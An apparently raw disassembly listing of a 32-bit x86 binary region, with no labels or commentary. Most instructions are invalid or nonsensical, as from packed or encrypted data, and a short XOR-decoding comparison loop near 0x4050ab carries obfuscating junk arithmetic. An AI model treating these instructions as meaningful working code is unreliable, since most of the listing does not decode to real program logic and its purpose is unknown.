  404a10:	dec    eax
  404a11:	lahf   
  404a12:	pusha  
  404a13:	in     eax,dx
  404a14:	push   ds
  404a15:	push   ebp
  404a16:	iret   
  404a17:	dec    edx
  404a19:	adc    bh,ch
  404a1b:	jno    0x404a05
  404a1d:	adc    DWORD PTR [eax],esp
  404a1f:	pop    ebp
  404a20:	test   BYTE PTR [ecx+0x371d5dfd],bl
  404a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a27:	lods   eax,DWORD PTR ds:[esi]
  404a28:	mov    edi,DWORD PTR [esi+0x66]
  404a2b:	inc    edx
  404a2c:	std    
  404a2d:	mov    dl,BYTE PTR [edi+0xd]
  404a30:	mov    ds:0xdd8ce7ce,al
  404a35:	fcomp  QWORD PTR [ebx+0x8]
  404a38:	inc    ebx
  404a39:	ins    DWORD PTR es:[edi],dx
  404a3a:	test   al,0x3f
  404a3c:	mov    eax,0x544dfa75
  404a41:	xchg   edi,eax
  404a42:	aad    0x11
  404a44:	cmp    edx,DWORD PTR [esi-0x40]
  404a47:	xchg   esp,eax
  404a48:	xor    BYTE PTR [edi],0xfb
  404a4b:	loop   0x404a67
  404a4d:	int3   
  404a4e:	scas   al,BYTE PTR es:[edi]
  404a4f:	or     eax,0xfae8ca1f
  404a54:	xor    al,0xa7
  404a56:	pushf  
  404a57:	sbb    BYTE PTR ds:0x8f871e3a,bh
  404a5d:	rcr    BYTE PTR [edx+edi*4-0x1a],0xff
  404a62:	add    dh,BYTE PTR [ebp+0x70]
  404a65:	out    0x12,eax
  404a67:	in     eax,dx
  404a68:	or     DWORD PTR [ebx+0x4eae8349],ebx
  404a6e:	jnp    0x404a2d
  404a70:	ret    0xdb73
  404a73:	xchg   esi,eax
  404a74:	mov    ch,BYTE PTR [ebp+eiz*1-0x6e39f8bf]
  404a7b:	mov    WORD PTR [edi+0x13],gs
  404a7e:	mov    WORD PTR [ebx+0x6],cs
  404a81:	mov    bh,0xd2
  404a83:	out    dx,eax
  404a84:	int    0xfb
  404a86:	jbe    0x404a2d
  404a88:	dec    esi
  404a89:	fcom   DWORD PTR [eax+esi*4+0x76a53a76]
  404a90:	fcomi  st,st(5)
  404a92:	cmc    
  404a93:	ins    DWORD PTR es:[edi],dx
  404a94:	sub    ch,BYTE PTR [esi]
  404a96:	ret    
  404a97:	sti    
  404a98:	add    al,0x2d
  404a9a:	sar    BYTE PTR [ecx+0x79831165],cl
  404aa0:	call   0x495988e
  404aa5:	(bad)  
  404aa7:	outs   dx,BYTE PTR ds:[esi]
  404aa8:	mov    ecx,0xa68f538d
  404aad:	push   0x5b889ae9
  404ab2:	mov    bh,0x2b
  404ab4:	xor    edi,DWORD PTR [bp+di-0x526f]
  404ab9:	mov    WORD PTR [edi-0x7],cs
  404abc:	pop    ecx
  404abd:	push   0x74a5b30
  404ac2:	ss jl  0x404ad4
  404ac5:	aam    0xa5
  404ac7:	jmp    0x847:0x37a9859c
  404ace:	das    
  404acf:	sub    dh,BYTE PTR [ebx+edx*2-0x35]
  404ad3:	jnp    0x404b37
  404ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad6:	jno    0x404a95
  404ad8:	add    al,0x16
  404ada:	(bad)  
  404adb:	jbe    0x404af1
  404add:	test   DWORD PTR [edi-0x55f27179],ebp
  404ae3:	les    ecx,FWORD PTR [esi+0x292106b]
  404ae9:	stos   DWORD PTR es:[edi],eax
  404aea:	jb     0x404aad
  404aec:	std    
  404aed:	ins    BYTE PTR es:[edi],dx
  404aee:	test   al,0xa2
  404af0:	fdiv   QWORD PTR [ebp+esi*4+0x69f8dd30]
  404af7:	in     al,dx
  404af8:	daa    
  404af9:	cld    
  404afa:	sub    DWORD PTR [ecx+ebp*8],esp
  404afd:	imul   DWORD PTR [ecx]
  404aff:	cmc    
  404b00:	dec    edi
  404b01:	fcmovu st,st(3)
  404b03:	cli    
  404b04:	jne    0x404b4a
  404b06:	ins    BYTE PTR es:[edi],dx
  404b07:	xchg   esp,eax
  404b08:	push   ecx
  404b09:	int    0xce
  404b0b:	sub    ebp,edi
  404b0d:	xor    al,0x4a
  404b0f:	jns    0x404ac7
  404b11:	pushf  
  404b12:	shl    DWORD PTR [eax-0x39],0x6a
  404b16:	and    eax,0x7e6399a9
  404b1b:	push   cs
  404b1c:	dec    ebp
  404b1d:	jge    0x404b02
  404b1f:	test   eax,0x3e6cf2eb
  404b24:	popf   
  404b25:	mov    ah,dl
  404b27:	mov    ds:0xf06c7ad3,al
  404b2c:	bnd jmp 0x3babbbfa
  404b32:	enter  0xf25c,0xa2
  404b36:	fwait
  404b37:	ja     0x404b72
  404b39:	xor    bh,BYTE PTR [edi-0x2889eade]
  404b3f:	iret   
  404b40:	push   0xffffff94
  404b42:	es pop ebx
  404b44:	xlat   BYTE PTR ds:[ebx]
  404b45:	jmp    0xbd189d6d
  404b4a:	xchg   edi,eax
  404b4b:	cmp    DWORD PTR [ecx+edi*8-0x6d],ebx
  404b4f:	sub    edx,esi
  404b51:	cwde   
  404b52:	sub    dl,bh
  404b54:	adc    BYTE PTR [ebx-0x3],bh
  404b57:	push   cs
  404b58:	xchg   edi,eax
  404b59:	popf   
  404b5a:	mov    bh,0x45
  404b5c:	adc    eax,0x60a07bb4
  404b61:	xor    DWORD PTR [ebp+0x4],0xe9d497f5
  404b68:	mov    bh,0x64
  404b6a:	inc    esi
  404b6b:	xor    ebx,DWORD PTR [esi]
  404b6d:	sbb    bl,BYTE PTR [ecx+edx*8-0xa736a1]
  404b74:	dec    esp
  404b75:	xchg   DWORD PTR [ebx+0x75bd949d],edx
  404b7b:	std    
  404b7c:	sbb    DWORD PTR [esp+eax*8],ebx
  404b7f:	add    DWORD PTR [edi+ebx*8+0x3c965007],ebp
  404b86:	mov    dh,0xb3
  404b88:	(bad)  
  404b89:	into   
  404b8a:	pushf  
  404b8b:	add    ah,ah
  404b8d:	mov    esp,0x99dded00
  404b92:	fbld   TBYTE PTR [ecx-0x17155738]
  404b98:	cmc    
  404b99:	pop    ebx
  404b9a:	scas   al,BYTE PTR es:[edi]
  404b9b:	js     0x404bbf
  404b9d:	fdiv   QWORD PTR [edx]
  404b9f:	fsub   st(5),st
  404ba1:	sbb    eax,0xca8bfc75
  404ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ba7:	xchg   ebx,eax
  404ba8:	and    DWORD PTR [ebx],ecx
  404baa:	ins    BYTE PTR es:[edi],dx
  404bab:	push   ds
  404bac:	mov    esp,0x6dfd07bc
  404bb1:	repz ret 
  404bb3:	sub    bh,BYTE PTR es:[ecx]
  404bb6:	lds    edx,FWORD PTR [eax]
  404bb8:	fadd   DWORD PTR [eax-0x21ab3ae0]
  404bbe:	sbb    bh,BYTE PTR [edi]
  404bc0:	arpl   WORD PTR [ecx-0x76b4dacc],di
  404bc6:	into   
  404bc7:	jle    0x404bb9
  404bc9:	xchg   ebx,eax
  404bca:	pop    eax
  404bcb:	lods   al,BYTE PTR ds:[esi]
  404bcc:	(bad)  
  404bcd:	cmp    DWORD PTR [ebx+0x66],edx
  404bd0:	neg    DWORD PTR [edi-0x64c41298]
  404bd6:	add    eax,0x91fbd6fc
  404bdb:	fidivr DWORD PTR [ebx]
  404bdd:	add    DWORD PTR [esp+ebx*4],eax
  404be0:	xchg   DWORD PTR [ecx],ecx
  404be2:	mov    dh,BYTE PTR [esi-0x2e]
  404be5:	scas   al,BYTE PTR es:[edi]
  404be6:	fst    st(2)
  404be8:	mov    ?,WORD PTR [ebx]
  404bea:	push   ss
  404beb:	jle    0x404bc2
  404bed:	mov    edx,0x635d9776
  404bf2:	jne    0x404c0f
  404bf4:	push   eax
  404bf5:	out    dx,eax
  404bf6:	dec    esi
  404bf7:	ins    DWORD PTR es:[edi],dx
  404bf8:	stos   BYTE PTR es:[edi],al
  404bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bfa:	xchg   esi,eax
  404bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bfc:	pop    ebx
  404bfd:	xchg   edi,eax
  404bfe:	dec    esi
  404bff:	push   eax
  404c00:	push   DWORD PTR [eax]
  404c02:	xchg   esi,eax
  404c03:	ret    
  404c04:	dec    esp
  404c05:	bound  esi,QWORD PTR [eax+0x40]
  404c08:	and    DWORD PTR [eax-0x45],ebx
  404c0b:	pop    edx
  404c0c:	xchg   esp,eax
  404c0d:	cmp    ebp,DWORD PTR [ebp+0x3b0f3ab1]
  404c13:	repz dec ebp
  404c15:	enter  0xedc5,0xff
  404c19:	iret   
  404c1a:	aad    0x84
  404c1c:	adc    esi,edx
  404c1e:	sub    bh,ah
  404c20:	or     ecx,DWORD PTR [esi+0x425ef994]
  404c26:	xor    al,0x69
  404c28:	xor    al,0x17
  404c2a:	sub    eax,0x9a932a33
  404c2f:	push   ebx
  404c30:	add    al,0x69
  404c32:	lds    ebx,FWORD PTR [ebx+0x7b]
  404c35:	imul   esi,DWORD PTR [ebx+0x3910779c],0x4
  404c3c:	pop    es
  404c3d:	cmp    ch,BYTE PTR ds:0x7a7b7377
  404c43:	out    dx,eax
  404c44:	imul   edi,DWORD PTR [esi-0x25e3331a],0xa70b4c3e
  404c4e:	in     al,0x17
  404c50:	jae    0x404be9
  404c52:	and    BYTE PTR [edi+esi*4],cl
  404c55:	push   edi
  404c56:	add    edi,DWORD PTR [eax]
  404c58:	pop    edi
  404c59:	mov    ebp,0xd39253bd
  404c5e:	out    dx,al
  404c5f:	mov    ecx,ebx
  404c61:	adc    ch,BYTE PTR [ebx-0x6974157c]
  404c67:	test   BYTE PTR [edi+0x4046645],dh
  404c6d:	ds ja  0x404caf
  404c70:	sub    ebp,DWORD PTR [esi-0x3a69bf3b]
  404c76:	cs int 0x55
  404c79:	dec    edi
  404c7a:	into   
  404c7b:	mov    ah,0x5f
  404c7d:	pop    edi
  404c7e:	test   BYTE PTR [ebp-0x4e],ah
  404c81:	(bad)  
  404c82:	repnz lds ebx,FWORD PTR ds:[ecx+0x68]
  404c87:	ror    BYTE PTR [eax+0xe],1
  404c8a:	xchg   edi,eax
  404c8b:	fwait
  404c8c:	sub    al,bh
  404c8e:	aas    
  404c8f:	aam    0xe5
  404c91:	mov    eax,edx
  404c93:	cmp    eax,0xf71bb4a6
  404c98:	xchg   DWORD PTR [edx],esi
  404c9a:	jl     0x404cde
  404c9c:	adc    eax,0x382f01a3
  404ca1:	mov    ebp,0x670dcba7
  404ca6:	clc    
  404ca7:	and    ecx,DWORD PTR [ebx-0x30]
  404caa:	imul   esi,ecx,0x69
  404cad:	ret    
  404cae:	pop    es
  404caf:	imul   DWORD PTR ds:0xea93ff49
  404cb5:	or     al,0xc1
  404cb7:	push   ecx
  404cb8:	and    DWORD PTR [ebp+0x4e2dd715],0x9
  404cbf:	ret    
  404cc0:	cmp    eax,0x9d5af67
  404cc5:	fsub   QWORD PTR [ecx+ecx*1-0xa]
  404cc9:	mov    esi,0x1b50525e
  404cce:	retf   
  404ccf:	mov    eax,?
  404cd1:	sbb    ebp,edi
  404cd3:	retf   
  404cd4:	js     0x404d50
  404cd6:	jecxz  0x404d12
  404cd8:	dec    esi
  404cd9:	popf   
  404cda:	repnz arpl WORD PTR [ebx],si
  404cdd:	xor    al,ah
  404cdf:	shl    DWORD PTR [ebx+edi*2],1
  404ce2:	or     DWORD PTR [edx],0x21
  404ce5:	or     edi,eax
  404ce7:	push   0x217ffbe4
  404cec:	dec    ebx
  404ced:	scas   al,BYTE PTR es:[edi]
  404cee:	pop    esi
  404cef:	aam    0xbe
  404cf1:	pusha  
  404cf2:	imul   eax,esp,0x2e
  404cf5:	add    al,0xa4
  404cf7:	dec    edx
  404cf8:	mov    eax,ds:0xc2ee998f
  404cfd:	ja     0x404d70
  404cff:	sub    eax,0x476f1a4f
  404d04:	jmp    0x3e9:0x4ab394dd
  404d0b:	mov    edi,0x42e7ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e7eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x18]
  404d39:	outs   dx,DWORD PTR ds:[esi]
  404d3a:	pop    edi
  404d3b:	push   eax
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0x470707d
  404d45:	cmp    BYTE PTR [eax-0x4a],0x0
  404d49:	fnstenv [edx+0x55d18ce2]
  404d4f:	jbe    0x404d5b
  404d51:	(bad)  
  404d52:	imul   ecx,DWORD PTR [ebx],0x23
  404d55:	sbb    edx,ebp
  404d57:	push   esi
  404d58:	popf   
  404d59:	inc    edi
  404d5a:	stos   BYTE PTR es:[edi],al
  404d5b:	aaa    
  404d5c:	pop    ecx
  404d5d:	mov    esp,0x4b78bfcc
  404d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d63:	aaa    
  404d64:	push   edi
  404d65:	inc    ebx
  404d66:	and    ah,ch
  404d68:	test   al,0xe5
  404d6a:	xor    ah,BYTE PTR [edi+0x7f0cf70e]
  404d70:	inc    eax
  404d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d72:	mov    edi,0xea4131f
  404d77:	dec    esp
  404d78:	pop    esp
  404d79:	mov    dh,0xc2
  404d7b:	mov    ds:0xdcb7b6b5,al
  404d80:	push   ecx
  404d81:	les    edi,FWORD PTR [esi+0x4f5a545f]
  404d87:	mov    ebp,0x18de0e5e
  404d8c:	xor    DWORD PTR ds:0x5a7304db,esi
  404d92:	pop    ecx
  404d93:	leave  
  404d94:	ins    DWORD PTR es:[edi],dx
  404d95:	push   ecx
  404d96:	jecxz  0x404d39
  404d98:	(bad)  
  404d99:	pop    esp
  404d9a:	call   0xa59678f
  404d9f:	popf   
  404da0:	aaa    
  404da1:	add    eax,0x94f48982
  404da6:	push   esi
  404da7:	fwait
  404da8:	lds    edi,FWORD PTR [edx+ecx*2]
  404dab:	aad    0x0
  404dad:	ins    DWORD PTR es:[edi],dx
  404dae:	dec    esi
  404daf:	or     DWORD PTR [ebx-0x7d],eax
  404db2:	jecxz  0x404dee
  404db4:	fisttp QWORD PTR [esi]
  404db6:	sti    
  404db7:	push   ebx
  404db8:	sbb    eax,0x6eb1ed6b
  404dbd:	dec    edx
  404dbe:	xchg   ecx,eax
  404dbf:	cmp    edi,ebx
  404dc1:	in     eax,dx
  404dc2:	jg     0x404d66
  404dc4:	outs   dx,BYTE PTR ds:[esi]
  404dc5:	cmp    eax,DWORD PTR [esi-0x37]
  404dc8:	xchg   esi,eax
  404dc9:	adc    al,0x3c
  404dcb:	xor    ecx,DWORD PTR [ebp-0x734be8d7]
  404dd1:	out    0x2d,al
  404dd3:	mov    ebp,0xbdba9275
  404dd8:	stc    
  404dd9:	mov    eax,0x944b44a8
  404dde:	pusha  
  404ddf:	adc    BYTE PTR [ebx+0x36c075c5],ch
  404de5:	stos   BYTE PTR es:[edi],al
  404de6:	scas   eax,DWORD PTR es:[edi]
  404de7:	jp     0x404dc3
  404de9:	and    esp,esp
  404deb:	repnz loope 0x404e12
  404dee:	shl    BYTE PTR [eax+0x52],0x71
  404df2:	retf   0xdda5
  404df5:	sahf   
  404df6:	cmp    BYTE PTR [esi+0x7b],bl
  404df9:	mov    eax,0xda2d0262
  404dfe:	out    dx,al
  404dff:	je     0x404dbc
  404e01:	dec    edi
  404e02:	push   ss
  404e03:	sub    al,0x96
  404e05:	sahf   
  404e06:	pop    es
  404e07:	call   0x962d141
  404e0c:	adc    BYTE PTR gs:[eax],bh
  404e0f:	xor    BYTE PTR [esi+0x35],bh
  404e12:	arpl   WORD PTR [edi],bp
  404e14:	dec    edx
  404e15:	jg     0x404e10
  404e17:	pop    ebx
  404e18:	jae    0x404dd7
  404e1a:	push   ecx
  404e1b:	iret   
  404e1c:	test   al,0x15
  404e1e:	test   BYTE PTR [ecx+0x40],bh
  404e21:	cmp    al,0x36
  404e23:	add    cl,ah
  404e25:	jns    0x404e69
  404e27:	sbb    BYTE PTR [ecx+0x1c429b49],cl
  404e2d:	and    bh,cl
  404e2f:	sti    
  404e30:	push   cs
  404e31:	push   ebp
  404e32:	dec    ebx
  404e33:	xchg   esp,eax
  404e34:	mov    ch,0xc3
  404e36:	loop   0x404dc7
  404e38:	inc    edi
  404e39:	pop    eax
  404e3a:	push   edx
  404e3b:	pushf  
  404e3c:	pop    ss
  404e3d:	pop    ds
  404e3e:	mov    esp,0x3bc5b330
  404e43:	pop    ds
  404e44:	pop    ecx
  404e45:	dec    eax
  404e46:	cmp    al,0xae
  404e49:	mul    BYTE PTR [ebx+0x4d6346a0]
  404e4f:	das    
  404e50:	add    ch,cl
  404e52:	adc    al,0x5b
  404e54:	xchg   ebp,eax
  404e55:	jnp    0x404e6b
  404e57:	(bad)  
  404e58:	cli    
  404e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e5a:	dec    esp
  404e5b:	aaa    
  404e5c:	xchg   ebp,eax
  404e5d:	cli    
  404e5e:	mov    bl,0xe0
  404e60:	xchg   esi,eax
  404e61:	jae    0x404eac
  404e63:	mov    al,0x97
  404e65:	outs   dx,BYTE PTR ds:[esi]
  404e66:	cmp    al,BYTE PTR [edx]
  404e68:	mov    ch,0x42
  404e6a:	lahf   
  404e6b:	push   ss
  404e6c:	or     dh,BYTE PTR fs:[esi-0x37cc55f7]
  404e73:	fst    QWORD PTR [edi-0x1b]
  404e76:	loop   0x404e21
  404e78:	sbb    bl,bl
  404e7a:	sbb    bl,al
  404e7c:	xchg   DWORD PTR [edx+0x2afd422e],ecx
  404e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e83:	and    eax,0x4e4a989e
  404e88:	and    ebp,0x9c6e6455
  404e8e:	lds    ebx,FWORD PTR [esi+esi*1-0x6ff67cda]
  404e95:	in     al,0x2a
  404e97:	div    DWORD PTR [esi-0x20]
  404e9a:	retf   0x3a56
  404e9d:	stos   BYTE PTR es:[edi],al
  404e9e:	fcmovne st,st(0)
  404ea0:	mov    cl,0xec
  404ea2:	outs   dx,BYTE PTR ds:[esi]
  404ea3:	jecxz  0x404e94
  404ea5:	ins    BYTE PTR es:[edi],dx
  404ea6:	mov    DWORD PTR [edx-0x61],edx
  404ea9:	mov    WORD PTR [ebx+eiz*2-0x2],?
  404ead:	sbb    al,0x63
  404eaf:	(bad)  
  404eb0:	iret   
  404eb1:	outs   dx,BYTE PTR ds:[esi]
  404eb2:	or     bh,BYTE PTR [eax]
  404eb4:	inc    edx
  404eb5:	fwait
  404eb6:	retf   
  404eb7:	retf   0xe612
  404eba:	inc    edx
  404ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ebc:	je     0x404ef5
  404ebe:	pop    eax
  404ebf:	mov    DWORD PTR [edx+ebp*8-0x7ab6452b],eax
  404ec6:	cs pop ds
  404ec8:	cdq    
  404ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eca:	pop    edx
  404ecb:	(bad)
  404ece:	and    ecx,ecx
  404ed0:	sub    al,0x7b
  404ed2:	icebp  
  404ed3:	sub    DWORD PTR [ebp+0x52],eax
  404ed6:	sub    DWORD PTR [ecx+0x12d626f1],eax
  404edc:	xor    DWORD PTR [ebp-0x737993b1],esi
  404ee2:	inc    esp
  404ee3:	push   ebp
  404ee4:	sti    
  404ee5:	js     0x404f0f
  404ee7:	iret   
  404ee8:	jg     0x404f3f
  404eea:	scas   eax,DWORD PTR es:[edi]
  404eeb:	bound  eax,QWORD PTR [edi+0x56c20f5e]
  404ef1:	and    DWORD PTR [edi],ebx
  404ef3:	mov    ch,0x7b
  404ef5:	test   bh,dh
  404ef7:	pop    es
  404ef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ef9:	(bad)  
  404efa:	jns    0x404f16
  404efc:	sahf   
  404efd:	mov    ecx,0xf3690ffe
  404f02:	ror    DWORD PTR [eax],1
  404f04:	sub    BYTE PTR [ebp-0x300046a7],ah
  404f0a:	dec    esi
  404f0b:	jae    0x404f2c
  404f0d:	mov    esi,0xaf42902f
  404f12:	mov    WORD PTR [eax+0x2817455c],gs
  404f18:	mov    bl,BYTE PTR [eax]
  404f1a:	sti    
  404f1b:	lods   al,BYTE PTR ds:[esi]
  404f1c:	outs   dx,DWORD PTR ds:[esi]
  404f1d:	inc    edi
  404f1e:	out    0x80,eax
  404f20:	pop    esi
  404f21:	cld    
  404f22:	pop    ebx
  404f23:	dec    esi
  404f24:	aaa    
  404f25:	sti    
  404f26:	out    0xcd,eax
  404f28:	mov    ah,dh
  404f2a:	enter  0xbf40,0xde
  404f2e:	jne    0x404f44
  404f30:	rcr    DWORD PTR [edx+0x5568d498],0x82
  404f37:	ins    DWORD PTR es:[edi],dx
  404f38:	cmc    
  404f39:	add    bl,0x45
  404f3c:	mov    ebp,0xebf990b4
  404f41:	push   0xfbeadd0e
  404f46:	ja     0x404f0e
  404f48:	fcomip st,st(1)
  404f4a:	or     eax,0x9bc95e24
  404f4f:	out    dx,al
  404f50:	sub    eax,0x3a6d565c
  404f55:	sub    eax,0x5d3b328b
  404f5a:	pusha  
  404f5b:	mov    BYTE PTR ds:0xb6e53c81,bl
  404f61:	mov    bl,0x2c
  404f63:	mov    esi,DWORD PTR [ecx+0x2a9a0839]
  404f69:	cmp    al,0x7
  404f6b:	test   DWORD PTR [edi+edi*4],esi
  404f6e:	rcl    BYTE PTR [esi+0x78],0x9e
  404f72:	and    al,0xe0
  404f74:	ret    0x3ba9
  404f77:	inc    eax
  404f78:	xchg   esi,eax
  404f79:	or     esp,DWORD PTR [edi-0x10980c1b]
  404f7f:	aas    
  404f80:	xchg   esi,eax
  404f81:	in     al,0x2c
  404f83:	and    BYTE PTR [ebp+edi*4+0x61fa4e96],dl
  404f8a:	mov    ds:0xa29d3b28,al
  404f8f:	ins    DWORD PTR es:[edi],dx
  404f90:	popf   
  404f91:	lods   eax,DWORD PTR ds:[esi]
  404f92:	mov    edx,0x53760aab
  404f97:	push   esp
  404f98:	in     al,dx
  404f99:	fstp   QWORD PTR [eax-0x66]
  404f9c:	mov    ds:0x5bf1a701,al
  404fa1:	test   BYTE PTR [ecx+0x3ca741d2],bl
  404fa7:	out    dx,al
  404fa8:	daa    
  404fa9:	pop    esi
  404faa:	retf   0xfcbe
  404fad:	ret    
  404fae:	lahf   
  404faf:	add    cl,dh
  404fb1:	repnz dec edx
  404fb3:	leave  
  404fb4:	icebp  
  404fb5:	jg     0x405000
  404fb7:	xor    DWORD PTR [ecx],0x110a1ba5
  404fbd:	fsubp  st(3),st
  404fbf:	mov    DWORD PTR [esi-0x65],esp
  404fc2:	std    
  404fc3:	aad    0x87
  404fc5:	sbb    eax,0x637acb38
  404fca:	inc    edi
  404fcb:	pop    ds
  404fcc:	push   ds
  404fcd:	sub    al,0xb1
  404fcf:	jecxz  0x404fdf
  404fd1:	and    DWORD PTR [ebp+0x65898ea1],esi
  404fd7:	jle    0x404f6a
  404fd9:	pcmpeqw mm6,QWORD PTR [edi]
  404fdc:	push   esi
  404fdd:	ins    DWORD PTR es:[edi],dx
  404fde:	push   es
  404fdf:	and    BYTE PTR [ecx],dh
  404fe1:	inc    ebp
  404fe2:	push   ds
  404fe3:	sbb    DWORD PTR [ebx],0xffffffe7
  404fe6:	mov    edx,0x49ddc82b
  404feb:	loop   0x404f7e
  404fed:	pop    ecx
  404fee:	outs   dx,BYTE PTR ds:[esi]
  404fef:	fwait
  404ff0:	inc    ebp
  404ff1:	push   ss
  404ff2:	mov    dh,0x32
  404ff4:	sti    
  404ff5:	jmp    0xb6bc33c2
  404ffa:	lods   eax,DWORD PTR ds:[esi]
  404ffb:	jge    0x404f97
  404ffd:	popa   
  404ffe:	shl    ah,1
  405000:	and    ebp,DWORD PTR [edx+0x67]
  405003:	xchg   edi,eax
  405004:	inc    esp
  405005:	adc    esp,DWORD PTR [ecx-0x48e556e5]
  40500b:	or     esp,DWORD PTR [ebx]
  40500d:	and    DWORD PTR [eax-0x7c8e2f52],edi
  405013:	ror    eax,1
  405015:	call   0x65e47c02
  40501a:	ss iret 
  40501c:	test   BYTE PTR [esi+0x5ddd0928],0x22
  405023:	aad    0x73
  405025:	leave  
  405026:	cmp    ebx,DWORD PTR [edx-0x1a9e67ed]
  40502c:	imul   eax,edx,0x581b2e21
  405032:	and    esi,DWORD PTR [eax+0x4284214a]
  405038:	jl     0x405010
  40503a:	jmp    0xc7b5:0xc113deda
  405041:	int3   
  405042:	es xor eax,0x56500ec0
  405048:	xor    ah,BYTE PTR [ecx]
  40504a:	jbe    0x404ff1
  40504c:	out    0x77,al
  40504e:	push   0x2d
  405050:	mov    eax,0x4d12138d
  405055:	mov    fs,WORD PTR [ebp+0x7e]
  405058:	and    eax,0xb47a7841
  40505d:	mov    bl,0x10
  40505f:	xchg   ebp,eax
  405060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405061:	(bad)  
  405062:	push   ecx
  405063:	cwde   
  405064:	xchg   ebp,eax
  405065:	mov    eax,ds:0x5107366e
  40506a:	inc    eax
  40506b:	(bad)  
  40506c:	sbb    bl,bl
  40506e:	cmp    al,0x94
  405070:	repnz add al,0x2d
  405073:	sbb    ebx,esp
  405075:	add    dh,ah
  405077:	mov    dl,0x7
  405079:	mov    ch,0xb1
  40507b:	sub    BYTE PTR [edx],al
  40507d:	jne    0x4050c5
  40507f:	or     edx,DWORD PTR [esi+0x34733aaf]
  405085:	mov    ds:0xf4458bdd,eax
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    DWORD PTR [ecx+0x532164a5],0x2b
  405137:	jo     0x4051a9
  405139:	cmp    eax,0xfb70707d
  40513e:	mov    bh,bl
  405140:	lahf   
  405141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405142:	cmp    al,BYTE PTR [eax-0x7c66580c]
  405148:	jb     0x4051b4
  40514a:	push   ss
  40514b:	and    ch,BYTE PTR [ebx+esi*4+0x1f]
  40514f:	xlat   BYTE PTR ds:[ebx]
  405150:	test   al,0xeb
  405152:	sbb    BYTE PTR [esi-0x6a],cl
  405155:	mov    ds:0x61910b25,al
  40515a:	inc    esi
  40515b:	inc    edi
  40515c:	loope  0x40514c
  40515e:	dec    ebp
  40515f:	call   0x2a82f856
  405164:	push   0xd6b4ec6b
  405169:	mov    ?,esp
  40516b:	xor    dh,0xa5
  40516e:	xchg   esi,eax
  40516f:	xchg   BYTE PTR ds:0xd2dae4ae,ch
  405175:	add    al,0x9e
  405177:	imul   edx,DWORD PTR ds:0xc7a9767b,0xaafcf80a
  405181:	mov    ds:0xe2bc9f9e,eax
  405186:	out    0x18,al
  405188:	or     al,0xca
  40518a:	mov    ebx,DWORD PTR [di+0x3200]
  40518f:	add    al,0x75
  405191:	sub    DWORD PTR [esi+0x5a],esi
  405194:	and    eax,0xb4e0b469
  405199:	xchg   edx,eax
  40519a:	loopne 0x4051cf
  40519c:	cmc    
  40519d:	sahf   
  40519e:	mov    cl,bl
  4051a0:	mov    ebx,0x11302be2
  4051a5:	push   ds
